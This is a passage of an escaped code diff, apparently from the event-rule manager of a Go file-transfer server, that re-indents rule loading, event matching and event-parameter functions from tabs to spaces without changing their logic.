eventManagerLog(logger.LevelDebug, \"removed rule %q from IDP login events\", name)\n+                        return\n+                }\n+        }\n+        for idx := range r.Schedules {\n+                if r.Schedules[idx].Name == name {\n+                        if schedules, ok := r.schedulesMapping[name]; ok {\n+                                for _, entryID := range schedules {\n+                                        eventManagerLog(logger.LevelDebug, \"removing scheduled entry id %d for rule %q\", entryID, name)\n+                                        eventScheduler.Remove(entryID)\n+                                }\n+                                delete(r.schedulesMapping, name)\n+                        }\n+\n+                        lastIdx := len(r.Schedules) - 1\n+                        r.Schedules[idx] = r.Schedules[lastIdx]\n+                        r.Schedules = r.Schedules[:lastIdx]\n+                        eventManagerLog(logger.LevelDebug, \"removed rule %q from scheduled events\", name)\n+                        return\n+                }\n+        }\n }\n \n func (r *eventRulesContainer) addUpdateRuleInternal(rule dataprovider.EventRule) {\n-\tr.removeRuleInternal(rule.Name)\n-\tif rule.DeletedAt > 0 {\n-\t\tdeletedAt := util.GetTimeFromMsecSinceEpoch(rule.DeletedAt)\n-\t\tif deletedAt.Add(30 * time.Minute).Before(time.Now()) {\n-\t\t\teventManagerLog(logger.LevelDebug, \"removing rule %q deleted at %s\", rule.Name, deletedAt)\n-\t\t\tgo dataprovider.RemoveEventRule(rule) //nolint:errcheck\n-\t\t}\n-\t\treturn\n-\t}\n-\tif rule.Status != 1 || rule.Trigger == dataprovider.EventTriggerOnDemand {\n-\t\treturn\n-\t}\n-\tswitch rule.Trigger {\n-\tcase dataprovider.EventTriggerFsEvent:\n-\t\tr.FsEvents = append(r.FsEvents, rule)\n-\t\teventManagerLog(logger.LevelDebug, \"added rule %q to fs events\", rule.Name)\n-\tcase dataprovider.EventTriggerProviderEvent:\n-\t\tr.ProviderEvents = append(r.ProviderEvents, rule)\n-\t\teventManagerLog(logger.LevelDebug, \"added rule %q to provider events\", rule.Name)\n-\tcase dataprovider.EventTriggerIPBlocked:\n-\t\tr.IPBlockedEvents = append(r.IPBlockedEvents, rule)\n-\t\teventManagerLog(logger.LevelDebug, \"added rule %q to IP blocked events\", rule.Name)\n-\tcase dataprovider.EventTriggerCertificate:\n-\t\tr.CertificateEvents = append(r.CertificateEvents, rule)\n-\t\teventManagerLog(logger.LevelDebug, \"added rule %q to certificate events\", rule.Name)\n-\tcase dataprovider.EventTriggerIDPLogin:\n-\t\tr.IPDLoginEvents = append(r.IPDLoginEvents, rule)\n-\t\teventManagerLog(logger.LevelDebug, \"added rule %q to IDP login events\", rule.Name)\n-\tcase dataprovider.EventTriggerSchedule:\n-\t\tfor _, schedule := range rule.Conditions.Schedules {\n-\t\t\tcronSpec := schedule.GetCronSpec()\n-\t\t\tjob := &eventCronJob{\n-\t\t\t\truleName: dataprovider.ConvertName(rule.Name),\n-\t\t\t}\n-\t\t\tentryID, err := eventScheduler.AddJob(cronSpec, job)\n-\t\t\tif err != nil {\n-\t\t\t\teventManagerLog(logger.LevelError, \"unable to add scheduled rule %q, cron string %q: %v\", rule.Name, cronSpec, err)\n-\t\t\t\treturn\n-\t\t\t}\n-\t\t\tr.schedulesMapping[rule.Name] = append(r.schedulesMapping[rule.Name], entryID)\n-\t\t\teventManagerLog(logger.LevelDebug, \"schedule for rule %q added, id: %d, cron string %q, active scheduling rules: %d\",\n-\t\t\t\trule.Name, entryID, cronSpec, len(r.schedulesMapping))\n-\t\t}\n-\t\tr.Schedules = append(r.Schedules, rule)\n-\t\teventManagerLog(logger.LevelDebug, \"added rule %q to scheduled events\", rule.Name)\n-\tdefault:\n-\t\teventManagerLog(logger.LevelError, \"unsupported trigger: %d\", rule.Trigger)\n-\t}\n+        r.removeRuleInternal(rule.Name)\n+        if rule.DeletedAt > 0 {\n+                deletedAt := util.GetTimeFromMsecSinceEpoch(rule.DeletedAt)\n+                if deletedAt.Add(30 * time.Minute).Before(time.Now()) {\n+                        eventManagerLog(logger.LevelDebug, \"removing rule %q deleted at %s\", rule.Name, deletedAt)\n+                        go dataprovider.RemoveEventRule(rule) //nolint:errcheck\n+                }\n+                return\n+        }\n+        if rule.Status != 1 || rule.Trigger == dataprovider.EventTriggerOnDemand {\n+                return\n+        }\n+        switch rule.Trigger {\n+        case dataprovider.EventTriggerFsEvent:\n+                r.FsEvents = append(r.FsEvents, rule)\n+                eventManagerLog(logger.LevelDebug, \"added rule %q to fs events\", rule.Name)\n+        case dataprovider.EventTriggerProviderEvent:\n+                r.ProviderEvents = append(r.ProviderEvents, rule)\n+                eventManagerLog(logger.LevelDebug, \"added rule %q to provider events\", rule.Name)\n+        case dataprovider.EventTriggerIPBlocked:\n+                r.IPBlockedEvents = append(r.IPBlockedEvents, rule)\n+                eventManagerLog(logger.LevelDebug, \"added rule %q to IP blocked events\", rule.Name)\n+        case dataprovider.EventTriggerCertificate:\n+                r.CertificateEvents = append(r.CertificateEvents, rule)\n+                eventManagerLog(logger.LevelDebug, \"added rule %q to certificate events\", rule.Name)\n+        case dataprovider.EventTriggerIDPLogin:\n+                r.IPDLoginEvents = append(r.IPDLoginEvents, rule)\n+                eventManagerLog(logger.LevelDebug, \"added rule %q to IDP login events\", rule.Name)\n+        case dataprovider.EventTriggerSchedule:\n+                for _, schedule := range rule.Conditions.Schedules {\n+                        cronSpec := schedule.GetCronSpec()\n+                        job := &eventCronJob{\n+                                ruleName: dataprovider.ConvertName(rule.Name),\n+                        }\n+                        entryID, err := eventScheduler.AddJob(cronSpec, job)\n+                        if err != nil {\n+                                eventManagerLog(logger.LevelError, \"unable to add scheduled rule %q, cron string %q: %v\", rule.Name, cronSpec, err)\n+                                return\n+                        }\n+                        r.schedulesMapping[rule.Name] = append(r.schedulesMapping[rule.Name], entryID)\n+                        eventManagerLog(logger.LevelDebug, \"schedule for rule %q added, id: %d, cron string %q, active scheduling rules: %d\",\n+                                rule.Name, entryID, cronSpec, len(r.schedulesMapping))\n+                }\n+                r.Schedules = append(r.Schedules, rule)\n+                eventManagerLog(logger.LevelDebug, \"added rule %q to scheduled events\", rule.Name)\n+        default:\n+                eventManagerLog(logger.LevelError, \"unsupported trigger: %d\", rule.Trigger)\n+        }\n }\n \n func (r *eventRulesContainer) loadRules() {\n-\teventManagerLog(logger.LevelDebug, \"loading updated rules\")\n-\tmodTime := util.GetTimeAsMsSinceEpoch(time.Now())\n-\tlastLoadTime := r.getLastLoadTime()\n-\trules, err := dataprovider.GetRecentlyUpdatedRules(lastLoadTime)\n-\tif err != nil {\n-\t\teventManagerLog(logger.LevelError, \"unable to load event rules: %v\", err)\n-\t\treturn\n-\t}\n-\teventManagerLog(logger.LevelDebug, \"recently updated event rules loaded: %d\", len(rules))\n-\n-\tif len(rules) > 0 {\n-\t\tr.Lock()\n-\t\tdefer r.Unlock()\n-\n-\t\tfor _, rule := range rules {\n-\t\t\tr.addUpdateRuleInternal(rule)\n-\t\t}\n-\t}\n-\teventManagerLog(logger.LevelDebug, \"event rules updated, fs events: %d, provider events: %d, schedules: %d, ip blocked events: %d, certificate events: %d, IDP login events: %d\",\n-\t\tlen(r.FsEvents), len(r.ProviderEvents), len(r.Schedules), len(r.IPBlockedEvents), len(r.CertificateEvents), len(r.IPDLoginEvents))\n-\n-\tr.setLastLoadTime(modTime)\n+        eventManagerLog(logger.LevelDebug, \"loading updated rules\")\n+        modTime := util.GetTimeAsMsSinceEpoch(time.Now())\n+        lastLoadTime := r.getLastLoadTime()\n+        rules, err := dataprovider.GetRecentlyUpdatedRules(lastLoadTime)\n+        if err != nil {\n+                eventManagerLog(logger.LevelError, \"unable to load event rules: %v\", err)\n+                return\n+        }\n+        eventManagerLog(logger.LevelDebug, \"recently updated event rules loaded: %d\", len(rules))\n+\n+        if len(rules) > 0 {\n+                r.Lock()\n+                defer r.Unlock()\n+\n+                for _, rule := range rules {\n+                        r.addUpdateRuleInternal(rule)\n+                }\n+        }\n+        eventManagerLog(logger.LevelDebug, \"event rules updated, fs events: %d, provider events: %d, schedules: %d, ip blocked events: %d, certificate events: %d, IDP login events: %d\",\n+                len(r.FsEvents), len(r.ProviderEvents), len(r.Schedules), len(r.IPBlockedEvents), len(r.CertificateEvents), len(r.IPDLoginEvents))\n+\n+        r.setLastLoadTime(modTime)\n }\n \n func (*eventRulesContainer) checkIPDLoginEventMatch(conditions *dataprovider.EventConditions, params *EventParams) bool {\n-\tswitch conditions.IDPLoginEvent {\n-\tcase dataprovider.IDPLoginUser:\n-\t\tif params.Event != IDPLoginUser {\n-\t\t\treturn false\n-\t\t}\n-\tcase dataprovider.IDPLoginAdmin:\n-\t\tif params.Event != IDPLoginAdmin {\n-\t\t\treturn false\n-\t\t}\n-\t}\n-\treturn checkEventConditionPatterns(params.Name, conditions.Options.Names)\n+        switch conditions.IDPLoginEvent {\n+        case dataprovider.IDPLoginUser:\n+                if params.Event != IDPLoginUser {\n+                        return false\n+                }\n+        case dataprovider.IDPLoginAdmin:\n+                if params.Event != IDPLoginAdmin {\n+                        return false\n+                }\n+        }\n+        return checkEventConditionPatterns(params.Name, conditions.Options.Names)\n }\n \n func (*eventRulesContainer) checkProviderEventMatch(conditions *dataprovider.EventConditions, params *EventParams) bool {\n-\tif !slices.Contains(conditions.ProviderEvents, params.Event) {\n-\t\treturn false\n-\t}\n-\tif !checkEventConditionPatterns(params.Name, conditions.Options.Names) {\n-\t\treturn false\n-\t}\n-\tif !checkEventConditionPatterns(params.Role, conditions.Options.RoleNames) {\n-\t\treturn false\n-\t}\n-\tif len(conditions.Options.ProviderObjects) > 0 && !slices.Contains(conditions.Options.ProviderObjects, params.ObjectType) {\n-\t\treturn false\n-\t}\n-\treturn true\n+        if !slices.Contains(conditions.ProviderEvents, params.Event) {\n+                return false\n+        }\n+        if !checkEventConditionPatterns(params.Name, conditions.Options.Names) {\n+                return false\n+        }\n+        if !checkEventConditionPatterns(params.Role, conditions.Options.RoleNames) {\n+                return false\n+        }\n+        if len(conditions.Options.ProviderObjects) > 0 && !slices.Contains(conditions.Options.ProviderObjects, params.ObjectType) {\n+                return false\n+        }\n+        return true\n }\n \n func (*eventRulesContainer) checkFsEventMatch(conditions *dataprovider.EventConditions, params *EventParams) bool {\n-\tif !slices.Contains(conditions.FsEvents, params.Event) {\n-\t\treturn false\n-\t}\n-\tif !checkEventConditionPatterns(params.Name, conditions.Options.Names) {\n-\t\treturn false\n-\t}\n-\tif !checkEventConditionPatterns(params.Role, conditions.Options.RoleNames) {\n-\t\treturn false\n-\t}\n-\tif !checkEventGroupConditionPatterns(params.Groups, conditions.Options.GroupNames) {\n-\t\treturn false\n-\t}\n-\tif !checkEventConditionPatterns(params.VirtualPath, conditions.Options.FsPaths) {\n-\t\treturn false\n-\t}\n-\tif len(conditions.Options.Protocols) > 0 && !slices.Contains(conditions.Options.Protocols, params.Protocol) {\n-\t\treturn false\n-\t}\n-\tif params.Event == operationUpload || params.Event == operationDownload {\n-\t\tif conditions.Options.MinFileSize > 0 {\n-\t\t\tif params.FileSize < conditions.Options.MinFileSize {\n-\t\t\t\treturn false\n-\t\t\t}\n-\t\t}\n-\t\tif conditions.Options.MaxFileSize > 0 {\n-\t\t\tif params.FileSize > conditions.Options.MaxFileSize {\n-\t\t\t\treturn false\n-\t\t\t}\n-\t\t}\n-\t}\n-\treturn true\n+        if !slices.Contains(conditions.FsEvents, params.Event) {\n+                return false\n+        }\n+        if !checkEventConditionPatterns(params.Name, conditions.Options.Names) {\n+                return false\n+        }\n+        if !checkEventConditionPatterns(params.Role, conditions.Options.RoleNames) {\n+                return false\n+        }\n+        if !checkEventGroupConditionPatterns(params.Groups, conditions.Options.GroupNames) {\n+                return false\n+        }\n+        if !checkEventConditionPatterns(params.VirtualPath, conditions.Options.FsPaths) {\n+                return false\n+        }\n+        if len(conditions.Options.Protocols) > 0 && !slices.Contains(conditions.Options.Protocols, params.Protocol) {\n+                return false\n+        }\n+        if params.Event == operationUpload || params.Event == operationDownload {\n+                if conditions.Options.MinFileSize > 0 {\n+                        if params.FileSize < conditions.Options.MinFileSize {\n+                                return false\n+                        }\n+                }\n+                if conditions.Options.MaxFileSize > 0 {\n+                        if params.FileSize > conditions.Options.MaxFileSize {\n+                                return false\n+                        }\n+                }\n+        }\n+        return true\n }\n \n // hasFsRules returns true if there are any rules for filesystem event triggers\n func (r *eventRulesContainer) hasFsRules() bool {\n-\tr.RLock()\n-\tdefer r.RUnlock()\n+        r.RLock()\n+        defer r.RUnlock()\n \n-\treturn len(r.FsEvents) > 0\n+        return len(r.FsEvents) > 0\n }\n \n // handleFsEvent executes the rules actions defined for the specified event.\n // The boolean parameter indicates whether a sync action was executed\n func (r *eventRulesContainer) handleFsEvent(params EventParams) (bool, error) {\n-\tif params.Protocol == protocolEventAction {\n-\t\treturn false, nil\n-\t}\n-\tr.RLock()\n-\n-\tvar rulesWithSyncActions, rulesAsync []dataprovider.EventRule\n-\tfor _, rule := range r.FsEvents {\n-\t\tif r.checkFsEventMatch(&rule.Conditions, &params) {\n-\t\t\tif err := rule.CheckActionsConsistency(\"\"); err != nil {\n-\t\t\t\teventManagerLog(logger.LevelWarn, \"rule %q skipped: %v, event %q\",\n-\t\t\t\t\trule.Name, err, params.Event)\n-\t\t\t\tcontinue\n-\t\t\t}\n-\t\t\thasSyncActions := false\n-\t\t\tfor _, action := range rule.Actions {\n-\t\t\t\tif action.Options.ExecuteSync {\n-\t\t\t\t\thasSyncActions = true\n-\t\t\t\t\tbreak\n-\t\t\t\t}\n-\t\t\t}\n-\t\t\tif hasSyncActions {\n-\t\t\t\trulesWithSyncActions = append(rulesWithSyncActions, rule)\n-\t\t\t} else {\n-\t\t\t\trulesAsync = append(rulesAsync, rule)\n-\t\t\t}\n-\t\t}\n-\t}\n-\n-\tr.RUnlock()\n-\n-\tparams.sender = params.Name\n-\tparams.addUID()\n-\tif len(rulesAsync) > 0 {\n-\t\tgo executeAsyncRulesActions(rulesAsync, params)\n-\t}\n-\n-\tif len(rulesWithSyncActions) > 0 {\n-\t\treturn true, executeSyncRulesActions(rulesWithSyncActions, params)\n-\t}\n-\treturn false, nil\n+        if params.Protocol == protocolEventAction {\n+                return false, nil\n+        }\n+        r.RLock()\n+\n+        var rulesWithSyncActions, rulesAsync []dataprovider.EventRule\n+        for _, rule := range r.FsEvents {\n+                if r.checkFsEventMatch(&rule.Conditions, &params) {\n+                        if err := rule.CheckActionsConsistency(\"\"); err != nil {\n+                                eventManagerLog(logger.LevelWarn, \"rule %q skipped: %v, event %q\",\n+                                        rule.Name, err, params.Event)\n+                                continue\n+                        }\n+                        hasSyncActions := false\n+                        for _, action := range rule.Actions {\n+                                if action.Options.ExecuteSync {\n+                                        hasSyncActions = true\n+                                        break\n+                                }\n+                        }\n+                        if hasSyncActions {\n+                                rulesWithSyncActions = append(rulesWithSyncActions, rule)\n+                        } else {\n+                                rulesAsync = append(rulesAsync, rule)\n+                        }\n+                }\n+        }\n+\n+        r.RUnlock()\n+\n+        params.sender = params.Name\n+        params.addUID()\n+        if len(rulesAsync) > 0 {\n+                go executeAsyncRulesActions(rulesAsync, params)\n+        }\n+\n+        if len(rulesWithSyncActions) > 0 {\n+                return true, executeSyncRulesActions(rulesWithSyncActions, params)\n+        }\n+        return false, nil\n }\n \n func (r *eventRulesContainer) handleIDPLoginEvent(params EventParams, customFields *map[string]any) (*dataprovider.User,\n-\t*dataprovider.Admin, error,\n+        *dataprovider.Admin, error,\n ) {\n-\tr.RLock()\n-\n-\tvar rulesWithSyncActions, rulesAsync []dataprovider.EventRule\n-\tfor _, rule := range r.IPDLoginEvents {\n-\t\tif r.checkIPDLoginEventMatch(&rule.Conditions, &params) {\n-\t\t\tif err := rule.CheckActionsConsistency(\"\"); err != nil {\n-\t\t\t\teventManagerLog(logger.LevelWarn, \"rule %q skipped: %v, event %q\",\n-\t\t\t\t\trule.Name, err, params.Event)\n-\t\t\t\tcontinue\n-\t\t\t}\n-\t\t\thasSyncActions := false\n-\t\t\tfor _, action := range rule.Actions {\n-\t\t\t\tif action.Options.ExecuteSync {\n-\t\t\t\t\thasSyncActions = true\n-\t\t\t\t\tbreak\n-\t\t\t\t}\n-\t\t\t}\n-\t\t\tif hasSyncActions {\n-\t\t\t\trulesWithSyncActions = append(rulesWithSyncActions, rule)\n-\t\t\t} else {\n-\t\t\t\trulesAsync = append(rulesAsync, rule)\n-\t\t\t}\n-\t\t}\n-\t}\n-\n-\tr.RUnlock()\n-\n-\tif len(rulesAsync) == 0 && len(rulesWithSyncActions) == 0 {\n-\t\treturn nil, nil, nil\n-\t}\n-\n-\tparams.addIDPCustomFields(customFields)\n-\tif len(rulesWithSyncActions) > 1 {\n-\t\tvar ruleNames []string\n-\t\tfor _, r := range rulesWithSyncActions {\n-\t\t\truleNames = append(ruleNames, r.Name)\n-\t\t}\n-\t\treturn nil, nil, fmt.Errorf(\"more than one account check action rules matches: %q\", strings.Join(ruleNames, \",\"))\n-\t}\n-\n-\tparams.addUID()\n-\tif len(rulesAsync) > 0 {\n-\t\tgo executeAsyncRulesActions(rulesAsync, params)\n-\t}\n-\n-\tif len(rulesWithSyncActions) > 0 {\n-\t\treturn executeIDPAccountCheckRule(rulesWithSyncActions[0], params)\n-\t}\n-\treturn nil, nil, nil\n+        r.RLock()\n+\n+        var rulesWithSyncActions, rulesAsync []dataprovider.EventRule\n+        for _, rule := range r.IPDLoginEvents {\n+                if r.checkIPDLoginEventMatch(&rule.Conditions, &params) {\n+                        if err := rule.CheckActionsConsistency(\"\"); err != nil {\n+                                eventManagerLog(logger.LevelWarn, \"rule %q skipped: %v, event %q\",\n+                                        rule.Name, err, params.Event)\n+                                continue\n+                        }\n+                        hasSyncActions := false\n+                        for _, action := range rule.Actions {\n+                                if action.Options.ExecuteSync {\n+                                        hasSyncActions = true\n+                                        break\n+                                }\n+                        }\n+                        if hasSyncActions {\n+                                rulesWithSyncActions = append(rulesWithSyncActions, rule)\n+                        } else {\n+                                rulesAsync = append(rulesAsync, rule)\n+                        }\n+                }\n+        }\n+\n+        r.RUnlock()\n+\n+        if len(rulesAsync) == 0 && len(rulesWithSyncActions) == 0 {\n+                return nil, nil, nil\n+        }\n+\n+        params.addIDPCustomFields(customFields)\n+        if len(rulesWithSyncActions) > 1 {\n+                var ruleNames []string\n+                for _, r := range rulesWithSyncActions {\n+                        ruleNames = append(ruleNames, r.Name)\n+                }\n+                return nil, nil, fmt.Errorf(\"more than one account check action rules matches: %q\", strings.Join(ruleNames, \",\"))\n+        }\n+\n+        params.addUID()\n+        if len(rulesAsync) > 0 {\n+                go executeAsyncRulesActions(rulesAsync, params)\n+        }\n+\n+        if len(rulesWithSyncActions) > 0 {\n+                return executeIDPAccountCheckRule(rulesWithSyncActions[0], params)\n+        }\n+        return nil, nil, nil\n }\n \n // username is populated for user objects\n func (r *eventRulesContainer) handleProviderEvent(params EventParams) {\n-\tr.RLock()\n-\tdefer r.RUnlock()\n-\n-\tvar rules []dataprovider.EventRule\n-\tfor _, rule := range r.ProviderEvents {\n-\t\tif r.checkProviderEventMatch(&rule.Conditions, &params) {\n-\t\t\tif err := rule.CheckActionsConsistency(params.ObjectType); err == nil {\n-\t\t\t\trules = append(rules, rule)\n-\t\t\t} else {\n-\t\t\t\teventManagerLog(logger.LevelWarn, \"rule %q skipped: %v, event %q object type %q\",\n-\t\t\t\t\trule.Name, err, params.Event, params.ObjectType)\n-\t\t\t}\n-\t\t}\n-\t}\n-\n-\tif len(rules) > 0 {\n-\t\tparams.sender = params.ObjectName\n-\t\tgo executeAsyncRulesActions(rules, params)\n-\t}\n+        r.RLock()\n+        defer r.RUnlock()\n+\n+        var rules []dataprovider.EventRule\n+        for _, rule := range r.ProviderEvents {\n+                if r.checkProviderEventMatch(&rule.Conditions, &params) {\n+                        if err := rule.CheckActionsConsistency(params.ObjectType); err == nil {\n+                                rules = append(rules, rule)\n+                        } else {\n+                                eventManagerLog(logger.LevelWarn, \"rule %q skipped: %v, event %q object type %q\",\n+                                        rule.Name, err, params.Event, params.ObjectType)\n+                        }\n+                }\n+        }\n+\n+        if len(rules) > 0 {\n+                params.sender = params.ObjectName\n+                go executeAsyncRulesActions(rules, params)\n+        }\n }\n \n func (r *eventRulesContainer) handleIPBlockedEvent(params EventParams) {\n-\tr.RLock()\n-\tdefer r.RUnlock()\n-\n-\tif len(r.IPBlockedEvents) == 0 {\n-\t\treturn\n-\t}\n-\tvar rules []dataprovider.EventRule\n-\tfor _, rule := range r.IPBlockedEvents {\n-\t\tif err := rule.CheckActionsConsistency(\"\"); err == nil {\n-\t\t\trules = append(rules, rule)\n-\t\t} else {\n-\t\t\teventManagerLog(logger.LevelWarn, \"rule %q skipped: %v, event %q\",\n-\t\t\t\trule.Name, err, params.Event)\n-\t\t}\n-\t}\n-\n-\tif len(rules) > 0 {\n-\t\tgo executeAsyncRulesActions(rules, params)\n-\t}\n+        r.RLock()\n+        defer r.RUnlock()\n+\n+        if len(r.IPBlockedEvents) == 0 {\n+                return\n+        }\n+        var rules []dataprovider.EventRule\n+        for _, rule := range r.IPBlockedEvents {\n+                if err := rule.CheckActionsConsistency(\"\"); err == nil {\n+                        rules = append(rules, rule)\n+                } else {\n+                        eventManagerLog(logger.LevelWarn, \"rule %q skipped: %v, event %q\",\n+                                rule.Name, err, params.Event)\n+                }\n+        }\n+\n+        if len(rules) > 0 {\n+                go executeAsyncRulesActions(rules, params)\n+        }\n }\n \n func (r *eventRulesContainer) handleCertificateEvent(params EventParams) {\n-\tr.RLock()\n-\tdefer r.RUnlock()\n-\n-\tif len(r.CertificateEvents) == 0 {\n-\t\treturn\n-\t}\n-\tvar rules []dataprovider.EventRule\n-\tfor _, rule := range r.CertificateEvents {\n-\t\tif err := rule.CheckActionsConsistency(\"\"); err == nil {\n-\t\t\trules = append(rules, rule)\n-\t\t} else {\n-\t\t\teventManagerLog(logger.LevelWarn, \"rule %q skipped: %v, event %q\",\n-\t\t\t\trule.Name, err, params.Event)\n-\t\t}\n-\t}\n-\n-\tif len(rules) > 0 {\n-\t\tgo executeAsyncRulesActions(rules, params)\n-\t}\n+        r.RLock()\n+        defer r.RUnlock()\n+\n+        if len(r.CertificateEvents) == 0 {\n+                return\n+        }\n+        var rules []dataprovider.EventRule\n+        for _, rule := range r.CertificateEvents {\n+                if err := rule.CheckActionsConsistency(\"\"); err == nil {\n+                        rules = append(rules, rule)\n+                } else {\n+                        eventManagerLog(logger.LevelWarn, \"rule %q skipped: %v, event %q\",\n+                                rule.Name, err, params.Event)\n+                }\n+        }\n+\n+        if len(rules) > 0 {\n+                go executeAsyncRulesActions(rules, params)\n+        }\n }\n \n type executedRetentionCheck struct {\n-\tUsername   string\n-\tActionName string\n-\tResults    []folderRetentionCheckResult\n+        Username   string\n+        ActionName string\n+        Results    []folderRetentionCheckResult\n }\n \n // EventParams defines the supported event parameters\n type EventParams struct {\n-\tName                  string\n-\tGroups                []sdk.GroupMapping\n-\tEvent                 string\n-\tStatus                int\n-\tVirtualPath           string\n-\tFsPath                string\n-\tVirtualTargetPath     string\n-\tFsTargetPath          string\n-\tObjectName            string\n-\tExtension             string\n-\tObjectType            string\n-\tFileSize              int64\n-\tElapsed               int64\n-\tProtocol              string\n-\tIP                    string\n-\tRole                  string\n-\tEmail                 string\n-\tTimestamp             time.Time\n-\tUID                   string\n-\tIDPCustomFields       *map[string]string\n-\tObject                plugin.Renderer\n-\tMetadata              map[string]string\n-\tsender                string\n-\tupdateStatusFromError bool\n-\terrors                []string\n-\tretentionChecks       []executedRetentionCheck\n+        Name                  string\n+        Groups                []sdk.GroupMapping\n+        Event                 string\n+        Status                int\n+        VirtualPath           string\n+        FsPath                string\n+        VirtualTargetPath     string\n+        FsTargetPath          string\n+        ObjectName            string\n+        Extension             string\n+        ObjectType            string\n+        FileSize              int64\n+        Elapsed               int64\n+        Protocol              string\n+        IP                    string\n+        Role                  string\n+        Email                 string\n+        Timestamp             time.Time\n+        UID                   string\n+        IDPCustomFields       *map[string]string\n+        Object                plugin.Renderer\n+        Metadata              map[string]string\n+        sender                string\n+        updateStatusFromError bool\n+        errors                []string\n+        retentionChecks       []executedRetentionCheck\n }\n \n func (p *EventParams) getACopy() *EventParams {\n-\tparams := *p\n-\tparams.errors = make([]string, len(p.errors))\n-\tcopy(params.errors, p.errors)\n-\tretentionChecks := make([]executedRetentionCheck, 0, len(p.retentionChecks))\n-\tfor _, c := range p.retentionChecks {\n-\t\texecutedCheck := executedRetentionCheck{\n-\t\t\tUsername:   c.Username,\n-\t\t\tActionName: c.ActionName,\n-\t\t}\n-\t\texecutedCheck.Results = make([]folderRetentionCheckResult, len(c.Results))\n-\t\tcopy(executedCheck.Results, c.Results)\n-\t\tretentionChecks = append(retentionChecks, executedCheck)\n-\t}\n-\tparams.retentionChecks = retentionChecks\n-\tif p.IDPCustomFields != nil {\n-\t\tfields := make(map[string]string)\n-\t\tfor k, v := range *p.IDPCustomFields {\n-\t\t\tfields[k] = v\n-\t\t}\n-\t\tparams.IDPCustomFields = &fields\n-\t}\n-\tif len(params.Metadata) > 0 {\n-\t\tmetadata := make(map[string]string)\n-\t\tfor k, v := range p.Metadata {\n-\t\t\tmetadata[k] = v\n-\t\t}\n-\t\tparams.Metadata = metadata\n-\t}\n-\n-\treturn &params\n+        params := *p\n+        params.errors = make([]string, len(p.errors))\n+        copy(params.errors, p.errors)\n+        retentionChecks := make([]executedRetentionCheck, 0, len(p.retentionChecks))\n+        for _, c := range p.retentionChecks {\n+                executedCheck := executedRetentionCheck{\n+                        Username:   c.Username,\n+                        ActionName: c.ActionName,\n+                }\n+                executedCheck.Results = make([]folderRetentionCheckResult, len(c.Results))\n+                copy(executedCheck.Results, c.Results)\n+                retentionChecks = append(retentionChecks, executedCheck)\n+        }\n+        params.retentionChecks = retentionChecks\n+        if p.IDPCustomFields != nil {\n+                fields := make(map[string]string)\n+                for k, v := range *p.IDPCustomFields {\n+                        fields[k] = v\n+                }\n+                params.IDPCustomFields = &fields\n+        }\n+        if len(params.Metadata) > 0 {\n+                metadata := make(map[string]string)\n+                for k, v := range p.Metadata {\n+                        metadata[k] = v\n+                }\n+                params.Metadata = metadata\n+        }\n+\n+        return &params\n }\n \n func (p *EventParams) addIDPCustomFields(customFields *map[string]any) {\n-\tif customFields == nil || len(*customFields) == 0 {\n-\t\treturn\n-\t}\n+        if customFields == nil || len(*customFields) == 0 {\n+                return\n+        }\n \n-\tfields := make(map[string]string)\n-\tfor k, v := range *customFields {\n-\t\tswitch val := v.(type) {\n-\t\tcase string:\n-\t\t\tfields[k] = val\n-\t\t}\n-\t}\n-\tp.IDPCustomFields = &fields\n+        fields := make(map[string]string)\n+        for k, v := range *customFields {\n+                switch val := v.(type) {\n+                case string:\n+                        fields[k] = val\n+                }\n+        }\n+        p.IDPCustomFields = &fields\n }\n \n // AddError adds a new error to the event params and update the status if needed\n func (p *EventParams) AddError(err error) {\n-\tif err == nil {\n-\t\treturn\n-\t}\n-\tif p.updateStatusFromError && p.Status == 1 {\n-\t\tp.Status = 2\n-\t}\n-\tp.errors = append(p.errors, err.Error())\n+        if err == nil {\n+                return\n+        }\n+        if p.updateStatusFromError && p.Status == 1 {\n+                p.Status = 2\n+        }\n+        p.errors = append(p.errors, err.Error())\n }\n \n func (p *EventParams) addUID() {\n-\tif p.UID == \"\" {\n-\t\tp.UID = util.GenerateUniqueID()\n-\t}\n+        if p.UID == \"\" {\n+                p.UID = util.GenerateUniqueID()\n+        }\n }\n \n func (p *EventParams) setBackupParams(backupPath string) {\n-\tif p.sender != \"\" {\n-\t\treturn\n-\t}\n-\tp.sender = dataprovider.ActionExecutorSystem\n-\tp.FsPath = backupPath\n-\tp.ObjectName = filepath.Base(backupPath)\n-\tp.VirtualPath = \"/\" + p.ObjectName\n-\tp.Timestamp = time.Now()\n-\tinfo, err := os.Stat(backupPath)\n-\tif err == nil {\n-\t\tp.FileSize = info.Size()\n-\t}\n+        if p.sender != \"\" {\n+                return\n+        }\n+        p.sender = dataprovider.ActionExecutorSystem\n+        p.FsPath = backupPath\n+        p.ObjectName = filepath.Base(backupPath)\n+        p.VirtualPath = \"/\" + p.ObjectName\n+        p.Timestamp = time.Now()\n+        info, err := os.Stat(backupPath)\n+        if err == nil {\n+                p.FileSize = info.Size()\n+        }\n }\n \n func (p *EventParams) getStatusString() string {\n-\tswitch p.Status {\n-\tcase 1:\n-\t\treturn \"OK\"\n-\tdefault:\n-\t\treturn \"KO\"\n-\t}\n+        switch p.Status {\n+        case 1:\n+                return \"OK\"\n+        default:\n+                return \"KO\"\n+        }\n }\n \n // getUsers returns users with group settings not applied\n func (p *EventParams) getUsers() ([]dataprovider.User, error) {\n-\tif p.sender == \"\" {\n-\t\tdump, err := dataprovider.DumpData([]string{dataprovider.DumpScopeUsers})\n-\t\tif err != nil {\n-\t\t\teventManagerLog(logger.LevelError, \"unable to get users: %+v\", err)\n-\t\t\treturn nil, errors.New(\"unable to get users\")\n-\t\t}\n-\t\treturn dump.Users, nil\n-\t}\n-\tuser, err := p.getUserFromSender()\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\treturn []dataprovider.User{user}, nil\n+        if p.sender == \"\" {\n+                dump, err := dataprovider.DumpData([]string{dataprovider.DumpScopeUsers})\n+                if err != nil {\n+                        eventManagerLog(logger.LevelError, \"unable to get users: %+v\", err)\n+                        return nil, errors.New(\"unable to get users\")\n+                }\n+                return dump.Users, nil\n+        }\n+        user, err := p.getUserFromSender()\n+        if err != nil {\n+                return nil, err\n+        }\n+        return []dataprovider.User{user}, nil\n }\n \n func (p *EventParams) getUserFromSender() (dataprovider.User, error) {\n-\tif p.sender == dataprovider.ActionExecutorSystem {\n-\t\treturn dataprovider.User{\n-\t\t\tBaseUser: sdk.BaseUser{\n-\t\t\t\tStatus:   1,\n-\t\t\t\tUsername: p.sender,\n-\t\t\t\tHomeDir:  